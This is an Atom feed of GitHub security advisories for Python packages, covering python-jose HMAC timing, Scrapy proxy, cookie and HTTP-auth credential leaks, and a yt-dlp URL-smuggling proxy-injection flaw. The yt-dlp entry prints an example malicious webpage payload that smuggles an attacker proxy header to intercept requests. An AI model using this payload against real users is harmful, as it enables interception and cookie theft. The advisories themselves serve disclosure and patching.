<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>https://azu.github.io/github-advisory-database-rss/pip.rss</id>
    <title>Security Advisory for Python packages hosted at PyPI.org</title>
    <updated>2023-11-16T07:01:21.128Z</updated>
    <generator>github-advisory-database-rss</generator>
    <link rel="alternate" href="https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip"/>
    <subtitle>Security Advisory for Python packages hosted at PyPI.org on GitHub</subtitle>
    <rights>github-advisory-database-rss</rights>
    <category term="CRITICAL"/>
    <category term="HIGH"/>
    <category term="MODERATE"/>
    <category term="LOW"/>
    <entry>
        <title type="html"><![CDATA[[python-jose] python-jose failure to use a constant time comparison for HMAC keys]]></title>
        <id>https://github.com/advisories/GHSA-w799-prg3-cx77</id>
        <link href="https://github.com/advisories/GHSA-w799-prg3-cx77"/>
        <updated>2023-11-16T05:04:43.000Z</updated>
        <content type="html"><![CDATA[<p>python-jose before 1.3.2 allows attackers to have unspecified impact by leveraging failure to use a constant time comparison for HMAC keys.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2016-7036">https://nvd.nist.gov/vuln/detail/CVE-2016-7036</a></li>
<li><a href="https://github.com/mpdavis/python-jose/releases/tag/1.3.2">https://github.com/mpdavis/python-jose/releases/tag/1.3.2</a></li>
<li><a href="https://web.archive.org/web/20210123221523/http://www.securityfocus.com/bid/95845">https://web.archive.org/web/20210123221523/http://www.securityfocus.com/bid/95845</a></li>
<li><a href="https://github.com/mpdavis/python-jose/commit/73007d6887a7517ac07c6e755e494baee49ef513">https://github.com/mpdavis/python-jose/commit/73007d6887a7517ac07c6e755e494baee49ef513</a></li>
<li><a href="https://github.com/advisories/GHSA-w799-prg3-cx77">https://github.com/advisories/GHSA-w799-prg3-cx77</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-w799-prg3-cx77</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2022-05-17T03:02:29.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scrapy] Scrapy before 2.6.2 and 1.8.3 vulnerable to one proxy sending credentials to another]]></title>
        <id>https://github.com/advisories/GHSA-9x8m-2xpf-crp3</id>
        <link href="https://github.com/advisories/GHSA-9x8m-2xpf-crp3"/>
        <updated>2023-11-15T18:31:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When the <a href="https://docs.scrapy.org/en/2.6/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpproxy">built-in HTTP proxy downloader middleware</a> processes a request with <code>proxy</code> metadata, and that <code>proxy</code> metadata includes proxy credentials, the built-in HTTP proxy downloader middleware sets the <code>Proxy-Authentication</code> header, but only if that header is not already set.</p>
<p>There are third-party proxy-rotation downloader middlewares that set different <code>proxy</code> metadata every time they process a request.</p>
<p>Because of request retries and redirects, the same request can be processed by downloader middlewares more than once, including both the built-in HTTP proxy downloader middleware and any third-party proxy-rotation downloader middleware.</p>
<p>These third-party proxy-rotation downloader middlewares could change the <code>proxy</code> metadata of a request to a new value, but fail to remove the <code>Proxy-Authentication</code> header from the previous value of the <code>proxy</code> metadata, causing the credentials of one proxy to be leaked to a different proxy.</p>
<p>If you rotate proxies from different proxy providers, and any of those proxies requires credentials, you are affected, unless you are handling proxy rotation as described under <strong>Workarounds</strong> below. If you use a third-party downloader middleware for proxy rotation, the same applies to that downloader middleware, and installing a patched version of Scrapy may not be enough; patching that downloader middlware may be necessary as well.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to Scrapy 2.6.2.</p>
<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.2 is not an option, you may upgrade to Scrapy 1.8.3 instead.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade, make sure that any code that changes the value of the <code>proxy</code> request meta also removes the <code>Proxy-Authorization</code> header from the request if present.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li><a href="https://github.com/scrapy/scrapy/issues">Open an issue</a></li>
<li><a href="mailto:opensource@zyte.com">Email us</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scrapy/scrapy/security/advisories/GHSA-9x8m-2xpf-crp3">https://github.com/scrapy/scrapy/security/advisories/GHSA-9x8m-2xpf-crp3</a></li>
<li><a href="https://github.com/scrapy/scrapy/commit/af7dd16d8ded3e6cb2946603688f4f4a5212e80f">https://github.com/scrapy/scrapy/commit/af7dd16d8ded3e6cb2946603688f4f4a5212e80f</a></li>
<li><a href="https://github.com/advisories/GHSA-9x8m-2xpf-crp3">https://github.com/advisories/GHSA-9x8m-2xpf-crp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9x8m-2xpf-crp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-07-29T22:26:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scrapy] Scrapy before 2.6.2 and 1.8.3 vulnerable to one proxy sending credentials to another]]></title>
        <id>https://github.com/advisories/GHSA-9x8m-2xpf-crp3</id>
        <link href="https://github.com/advisories/GHSA-9x8m-2xpf-crp3"/>
        <updated>2023-11-15T18:31:23.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>When the <a href="https://docs.scrapy.org/en/2.6/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpproxy">built-in HTTP proxy downloader middleware</a> processes a request with <code>proxy</code> metadata, and that <code>proxy</code> metadata includes proxy credentials, the built-in HTTP proxy downloader middleware sets the <code>Proxy-Authentication</code> header, but only if that header is not already set.</p>
<p>There are third-party proxy-rotation downloader middlewares that set different <code>proxy</code> metadata every time they process a request.</p>
<p>Because of request retries and redirects, the same request can be processed by downloader middlewares more than once, including both the built-in HTTP proxy downloader middleware and any third-party proxy-rotation downloader middleware.</p>
<p>These third-party proxy-rotation downloader middlewares could change the <code>proxy</code> metadata of a request to a new value, but fail to remove the <code>Proxy-Authentication</code> header from the previous value of the <code>proxy</code> metadata, causing the credentials of one proxy to be leaked to a different proxy.</p>
<p>If you rotate proxies from different proxy providers, and any of those proxies requires credentials, you are affected, unless you are handling proxy rotation as described under <strong>Workarounds</strong> below. If you use a third-party downloader middleware for proxy rotation, the same applies to that downloader middleware, and installing a patched version of Scrapy may not be enough; patching that downloader middlware may be necessary as well.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to Scrapy 2.6.2.</p>
<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.2 is not an option, you may upgrade to Scrapy 1.8.3 instead.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade, make sure that any code that changes the value of the <code>proxy</code> request meta also removes the <code>Proxy-Authorization</code> header from the request if present.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li><a href="https://github.com/scrapy/scrapy/issues">Open an issue</a></li>
<li><a href="mailto:opensource@zyte.com">Email us</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scrapy/scrapy/security/advisories/GHSA-9x8m-2xpf-crp3">https://github.com/scrapy/scrapy/security/advisories/GHSA-9x8m-2xpf-crp3</a></li>
<li><a href="https://github.com/scrapy/scrapy/commit/af7dd16d8ded3e6cb2946603688f4f4a5212e80f">https://github.com/scrapy/scrapy/commit/af7dd16d8ded3e6cb2946603688f4f4a5212e80f</a></li>
<li><a href="https://github.com/advisories/GHSA-9x8m-2xpf-crp3">https://github.com/advisories/GHSA-9x8m-2xpf-crp3</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-9x8m-2xpf-crp3</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-07-29T22:26:57.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scrapy] Scrapy cookie-setting is not restricted based on the public suffix list]]></title>
        <id>https://github.com/advisories/GHSA-mfjm-vh54-3f96</id>
        <link href="https://github.com/advisories/GHSA-mfjm-vh54-3f96"/>
        <updated>2023-11-15T18:30:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Responses from domain names whose public domain name suffix contains 1 or more periods (e.g. responses from <code>example.co.uk</code>, given its public domain name suffix is <code>co.uk</code>) are able to set cookies that are included in requests to any other domain sharing the same domain name suffix.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to Scrapy 2.6.0, which restricts cookies with their domain set to any of those in the <a href="https://publicsuffix.org/">public suffix list</a>.</p>
<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.0 is not an option, you may upgrade to Scrapy 1.8.2 instead.</p>
<h3 id="workarounds">Workarounds</h3>
<p>The only workaround for unpatched versions of Scrapy is to <a href="https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#std-setting-COOKIES_ENABLED">disable cookies altogether</a>, or <a href="https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.Spider.allowed_domains">limit target domains</a> to a subset that does not include domain names with one of the public domain suffixes affected (those with 1 or more periods).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://publicsuffix.org/">https://publicsuffix.org/</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li><a href="https://github.com/scrapy/scrapy/issues">Open an issue</a></li>
<li><a href="mailto:opensource@zyte.com">Email us</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/scrapy/scrapy/security/advisories/GHSA-mfjm-vh54-3f96">https://github.com/scrapy/scrapy/security/advisories/GHSA-mfjm-vh54-3f96</a></li>
<li><a href="https://github.com/scrapy/scrapy/commit/e865c4430e58a4faa0e0766b23830f8423d6167a">https://github.com/scrapy/scrapy/commit/e865c4430e58a4faa0e0766b23830f8423d6167a</a></li>
<li><a href="https://github.com/advisories/GHSA-mfjm-vh54-3f96">https://github.com/advisories/GHSA-mfjm-vh54-3f96</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mfjm-vh54-3f96</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-03-01T22:13:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scrapy] Scrapy cookie-setting is not restricted based on the public suffix list]]></title>
        <id>https://github.com/advisories/GHSA-mfjm-vh54-3f96</id>
        <link href="https://github.com/advisories/GHSA-mfjm-vh54-3f96"/>
        <updated>2023-11-15T18:30:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Responses from domain names whose public domain name suffix contains 1 or more periods (e.g. responses from <code>example.co.uk</code>, given its public domain name suffix is <code>co.uk</code>) are able to set cookies that are included in requests to any other domain sharing the same domain name suffix.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to Scrapy 2.6.0, which restricts cookies with their domain set to any of those in the <a href="https://publicsuffix.org/">public suffix list</a>.</p>
<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.0 is not an option, you may upgrade to Scrapy 1.8.2 instead.</p>
<h3 id="workarounds">Workarounds</h3>
<p>The only workaround for unpatched versions of Scrapy is to <a href="https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#std-setting-COOKIES_ENABLED">disable cookies altogether</a>, or <a href="https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.Spider.allowed_domains">limit target domains</a> to a subset that does not include domain names with one of the public domain suffixes affected (those with 1 or more periods).</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://publicsuffix.org/">https://publicsuffix.org/</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li><a href="https://github.com/scrapy/scrapy/issues">Open an issue</a></li>
<li><a href="mailto:opensource@zyte.com">Email us</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/scrapy/scrapy/security/advisories/GHSA-mfjm-vh54-3f96">https://github.com/scrapy/scrapy/security/advisories/GHSA-mfjm-vh54-3f96</a></li>
<li><a href="https://github.com/scrapy/scrapy/commit/e865c4430e58a4faa0e0766b23830f8423d6167a">https://github.com/scrapy/scrapy/commit/e865c4430e58a4faa0e0766b23830f8423d6167a</a></li>
<li><a href="https://github.com/advisories/GHSA-mfjm-vh54-3f96">https://github.com/advisories/GHSA-mfjm-vh54-3f96</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-mfjm-vh54-3f96</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-03-01T22:13:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scrapy] Incorrect Authorization and Exposure of Sensitive Information to an Unauthorized Actor in scrapy]]></title>
        <id>https://github.com/advisories/GHSA-cjvr-mfj7-j4j8</id>
        <link href="https://github.com/advisories/GHSA-cjvr-mfj7-j4j8"/>
        <updated>2023-11-15T18:29:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If you manually define cookies on a <a href="https://docs.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Request"><code>Request</code></a> object, and that <code>Request</code> object gets a redirect response, the new <code>Request</code> object scheduled to follow the redirect keeps those user-defined cookies, regardless of the target domain.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to Scrapy 2.6.0, which resets cookies when creating <code>Request</code> objects to follow redirects¹, and drops the <code>Cookie</code> header if manually-defined if the redirect target URL domain name does not match the source URL domain name².</p>
<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.0 is not an option, you may upgrade to Scrapy 1.8.2 instead.</p>
<p>¹ At that point the original, user-set cookies have been processed by the cookie middleware into the global or request-specific cookiejar, with their domain restricted to the domain of the original URL, so when the cookie middleware processes the new (redirect) request it will incorporate those cookies into the new request as long as the domain of the new request matches the domain of the original request.</p>
<p>² This prevents cookie leaks to unintended domains even if the cookies middleware is not used.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade, set your cookies using a list of dictionaries instead of a single dictionary, as described in the <a href="https://docs.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Request"><code>Request</code> documentation</a>, and set the right domain for each cookie.</p>
<p>Alternatively, you can <a href="https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#std-setting-COOKIES_ENABLED">disable cookies altogether</a>, or <a href="https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.Spider.allowed_domains">limit target domains</a> to domains that you trust with all your user-set cookies.</p>
<h3 id="references">References</h3>
<ul>
<li>Originally reported at <a href="https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585/">huntr.dev</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li><a href="https://github.com/scrapy/scrapy/issues">Open an issue</a></li>
<li><a href="mailto:opensource@zyte.com">Email us</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/scrapy/scrapy/security/advisories/GHSA-cjvr-mfj7-j4j8">https://github.com/scrapy/scrapy/security/advisories/GHSA-cjvr-mfj7-j4j8</a></li>
<li><a href="https://github.com/scrapy/scrapy/commit/8ce01b3b76d4634f55067d6cfdf632ec70ba304a">https://github.com/scrapy/scrapy/commit/8ce01b3b76d4634f55067d6cfdf632ec70ba304a</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-0577">https://nvd.nist.gov/vuln/detail/CVE-2022-0577</a></li>
<li><a href="https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585">https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html">https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/scrapy/PYSEC-2022-159.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/scrapy/PYSEC-2022-159.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-cjvr-mfj7-j4j8">https://github.com/advisories/GHSA-cjvr-mfj7-j4j8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cjvr-mfj7-j4j8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-03-01T22:12:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[scrapy] Incorrect Authorization and Exposure of Sensitive Information to an Unauthorized Actor in scrapy]]></title>
        <id>https://github.com/advisories/GHSA-cjvr-mfj7-j4j8</id>
        <link href="https://github.com/advisories/GHSA-cjvr-mfj7-j4j8"/>
        <updated>2023-11-15T18:29:54.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If you manually define cookies on a <a href="https://docs.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Request"><code>Request</code></a> object, and that <code>Request</code> object gets a redirect response, the new <code>Request</code> object scheduled to follow the redirect keeps those user-defined cookies, regardless of the target domain.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to Scrapy 2.6.0, which resets cookies when creating <code>Request</code> objects to follow redirects¹, and drops the <code>Cookie</code> header if manually-defined if the redirect target URL domain name does not match the source URL domain name².</p>
<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.6.0 is not an option, you may upgrade to Scrapy 1.8.2 instead.</p>
<p>¹ At that point the original, user-set cookies have been processed by the cookie middleware into the global or request-specific cookiejar, with their domain restricted to the domain of the original URL, so when the cookie middleware processes the new (redirect) request it will incorporate those cookies into the new request as long as the domain of the new request matches the domain of the original request.</p>
<p>² This prevents cookie leaks to unintended domains even if the cookies middleware is not used.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade, set your cookies using a list of dictionaries instead of a single dictionary, as described in the <a href="https://docs.scrapy.org/en/latest/topics/request-response.html#scrapy.http.Request"><code>Request</code> documentation</a>, and set the right domain for each cookie.</p>
<p>Alternatively, you can <a href="https://docs.scrapy.org/en/latest/topics/downloader-middleware.html#std-setting-COOKIES_ENABLED">disable cookies altogether</a>, or <a href="https://docs.scrapy.org/en/latest/topics/spiders.html#scrapy.spiders.Spider.allowed_domains">limit target domains</a> to domains that you trust with all your user-set cookies.</p>
<h3 id="references">References</h3>
<ul>
<li>Originally reported at <a href="https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585/">huntr.dev</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li><a href="https://github.com/scrapy/scrapy/issues">Open an issue</a></li>
<li><a href="mailto:opensource@zyte.com">Email us</a></li>
</ul>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/scrapy/scrapy/security/advisories/GHSA-cjvr-mfj7-j4j8">https://github.com/scrapy/scrapy/security/advisories/GHSA-cjvr-mfj7-j4j8</a></li>
<li><a href="https://github.com/scrapy/scrapy/commit/8ce01b3b76d4634f55067d6cfdf632ec70ba304a">https://github.com/scrapy/scrapy/commit/8ce01b3b76d4634f55067d6cfdf632ec70ba304a</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-0577">https://nvd.nist.gov/vuln/detail/CVE-2022-0577</a></li>
<li><a href="https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585">https://huntr.dev/bounties/3da527b1-2348-4f69-9e88-2e11a96ac585</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html">https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/scrapy/PYSEC-2022-159.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/scrapy/PYSEC-2022-159.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-cjvr-mfj7-j4j8">https://github.com/advisories/GHSA-cjvr-mfj7-j4j8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-cjvr-mfj7-j4j8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2022-03-01T22:12:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Scrapy] Scrapy HTTP authentication credentials potentially leaked to target websites ]]></title>
        <id>https://github.com/advisories/GHSA-jwqp-28gf-p498</id>
        <link href="https://github.com/advisories/GHSA-jwqp-28gf-p498"/>
        <updated>2023-11-15T18:27:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If you use <a href="http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth"><code>HttpAuthMiddleware</code></a> (i.e. the <code>http_user</code> and <code>http_pass</code> spider attributes) for HTTP authentication, all requests will expose your credentials to the request target.</p>
<p>This includes requests generated by Scrapy components, such as <code>robots.txt</code> requests sent by Scrapy when the <code>ROBOTSTXT_OBEY</code> setting is set to <code>True</code>, or as requests reached through redirects.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to Scrapy 2.5.1 and use the new <code>http_auth_domain</code> spider attribute to control which domains are allowed to receive the configured HTTP authentication credentials.</p>
<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.5.1 is not an option, you may upgrade to Scrapy 1.8.1 instead.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade, set your HTTP authentication credentials on a per-request basis, using for example the <a href="https://w3lib.readthedocs.io/en/latest/w3lib.html#w3lib.http.basic_auth_header"><code>w3lib.http.basic_auth_header</code></a> function to convert your credentials into a value that you can assign to the <code>Authorization</code> header of your request, instead of defining your credentials globally using <a href="http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth"><code>HttpAuthMiddleware</code></a>.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li><a href="https://github.com/scrapy/scrapy/issues">Open an issue</a></li>
<li><a href="mailto:opensource@zyte.com">Email us</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scrapy/scrapy/security/advisories/GHSA-jwqp-28gf-p498">https://github.com/scrapy/scrapy/security/advisories/GHSA-jwqp-28gf-p498</a></li>
<li><a href="https://github.com/scrapy/scrapy/commit/b01d69a1bf48060daec8f751368622352d8b85a6">https://github.com/scrapy/scrapy/commit/b01d69a1bf48060daec8f751368622352d8b85a6</a></li>
<li><a href="https://w3lib.readthedocs.io/en/latest/w3lib.html#w3lib.http.basic_auth_header">https://w3lib.readthedocs.io/en/latest/w3lib.html#w3lib.http.basic_auth_header</a></li>
<li><a href="http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth">http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41125">https://nvd.nist.gov/vuln/detail/CVE-2021-41125</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html">https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html</a></li>
<li><a href="https://github.com/advisories/GHSA-jwqp-28gf-p498">https://github.com/advisories/GHSA-jwqp-28gf-p498</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jwqp-28gf-p498</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-10-06T17:46:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Scrapy] Scrapy HTTP authentication credentials potentially leaked to target websites ]]></title>
        <id>https://github.com/advisories/GHSA-jwqp-28gf-p498</id>
        <link href="https://github.com/advisories/GHSA-jwqp-28gf-p498"/>
        <updated>2023-11-15T18:27:38.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>If you use <a href="http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth"><code>HttpAuthMiddleware</code></a> (i.e. the <code>http_user</code> and <code>http_pass</code> spider attributes) for HTTP authentication, all requests will expose your credentials to the request target.</p>
<p>This includes requests generated by Scrapy components, such as <code>robots.txt</code> requests sent by Scrapy when the <code>ROBOTSTXT_OBEY</code> setting is set to <code>True</code>, or as requests reached through redirects.</p>
<h3 id="patches">Patches</h3>
<p>Upgrade to Scrapy 2.5.1 and use the new <code>http_auth_domain</code> spider attribute to control which domains are allowed to receive the configured HTTP authentication credentials.</p>
<p>If you are using Scrapy 1.8 or a lower version, and upgrading to Scrapy 2.5.1 is not an option, you may upgrade to Scrapy 1.8.1 instead.</p>
<h3 id="workarounds">Workarounds</h3>
<p>If you cannot upgrade, set your HTTP authentication credentials on a per-request basis, using for example the <a href="https://w3lib.readthedocs.io/en/latest/w3lib.html#w3lib.http.basic_auth_header"><code>w3lib.http.basic_auth_header</code></a> function to convert your credentials into a value that you can assign to the <code>Authorization</code> header of your request, instead of defining your credentials globally using <a href="http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth"><code>HttpAuthMiddleware</code></a>.</p>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory:</p>
<ul>
<li><a href="https://github.com/scrapy/scrapy/issues">Open an issue</a></li>
<li><a href="mailto:opensource@zyte.com">Email us</a></li>
</ul>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/scrapy/scrapy/security/advisories/GHSA-jwqp-28gf-p498">https://github.com/scrapy/scrapy/security/advisories/GHSA-jwqp-28gf-p498</a></li>
<li><a href="https://github.com/scrapy/scrapy/commit/b01d69a1bf48060daec8f751368622352d8b85a6">https://github.com/scrapy/scrapy/commit/b01d69a1bf48060daec8f751368622352d8b85a6</a></li>
<li><a href="https://w3lib.readthedocs.io/en/latest/w3lib.html#w3lib.http.basic_auth_header">https://w3lib.readthedocs.io/en/latest/w3lib.html#w3lib.http.basic_auth_header</a></li>
<li><a href="http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth">http://doc.scrapy.org/en/latest/topics/downloader-middleware.html#module-scrapy.downloadermiddlewares.httpauth</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41125">https://nvd.nist.gov/vuln/detail/CVE-2021-41125</a></li>
<li><a href="https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html">https://lists.debian.org/debian-lts-announce/2022/03/msg00021.html</a></li>
<li><a href="https://github.com/advisories/GHSA-jwqp-28gf-p498">https://github.com/advisories/GHSA-jwqp-28gf-p498</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jwqp-28gf-p498</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2021-10-06T17:46:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[yt-dlp] yt-dlp Generic Extractor MITM Vulnerability via Arbitrary Proxy Injection]]></title>
        <id>https://github.com/advisories/GHSA-3ch3-jhc6-5r8x</id>
        <link href="https://github.com/advisories/GHSA-3ch3-jhc6-5r8x"/>
        <updated>2023-11-15T14:48:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>The Generic Extractor in yt-dlp is vulnerable to an attacker setting an arbitrary proxy for a request to an arbitrary url, allowing the attacker to MITM the request made from yt-dlp's HTTP session. This could lead to cookie exfiltration in some cases.</p>
<details>

<p>To pass extra control data between extractors (such as headers like <code>Referer</code>), yt-dlp employs a concept of "url smuggling". This works by adding this extra data as json to the url fragment ("smuggling") that is then passed on to an extractor. The receiving extractor then "unsmuggles" the data from the input url. This functionality is intended to be internal only.</p>
<p>Currently, the Generic extractor supports receiving an arbitrary dictionary of HTTP headers in a smuggled url, of which it extracts and adds them to the initial request it makes to such url. This is useful when a url sent to the Generic extractor needs a <code>Referer</code> header sent with it, for example.</p>
<p>Additionally, yt-dlp has internal headers to set a proxy for a request: <code>Ytdl-request-proxy</code> and <code>Ytdl-socks-proxy</code>. While these are deprecated, internally <code>Ytdl-request-proxy</code> is still used for <code>--geo-verification-proxy</code>.</p>
<p>However, it is possible for a maliciously crafted site include these smuggled options in a url which then the Generic extractor extracts and redirects to itself.  This allows a malicious website to <strong>set an arbitrary proxy for an arbitrary url that the Generic extractor will request.</strong></p>
<p>This could allow for the following, but not limited too:</p>
<ul>
<li>An attacker can MITM a request it asks yt-dlp to make to <strong>any</strong> website.<ul>
<li>If a user has loaded cookies into yt-dlp for the target site, which are not marked as <a href="https://en.wikipedia.org/wiki/Secure_cookie">secure</a>, they could be exfiltrated by the attacker.</li>
<li>Fortunately most sites are HTTPS and should be setting cookies as secure.</li>
</ul>
</li>
<li>An attacker can set cookies for an arbitrary site.</li>
</ul>
<p>An example malicious webpage:</p>
<pre><code class="language-html">&lt;!DOCTYPE html&gt;
&lt;cinerama.embedPlayer('t','{{ target_site }}#__youtubedl_smuggle=%7B%22http_headers%22:%7B%22Ytdl-request-proxy%22:%22{{ proxy url }}%22%7D,%22fake%22:%22.smil/manifest%22%7D')
</code></pre>
